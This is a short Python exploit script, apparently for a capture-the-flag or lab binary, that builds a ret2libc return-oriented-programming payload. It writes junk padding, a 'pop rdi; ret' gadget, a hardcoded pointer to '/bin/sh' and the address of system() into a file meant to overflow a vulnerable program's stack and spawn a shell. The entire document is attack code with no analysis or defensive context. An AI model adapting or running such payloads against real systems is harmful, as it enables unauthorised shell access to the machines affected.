#! /usr/bin/env python

from struct import *

buf = ""
buf += "A"*10 #junk
buf += pack("<Q", 0x00000000004009b3) #pop rdi; ret;
buf += pack("<Q", 0x7ffff7f63cee) #pointer to "/bin/sh"
buf += pack("<Q", 0x7ffff7e26ff0) #address of system()

f = open("in.txt", "w")
f.write(buf)
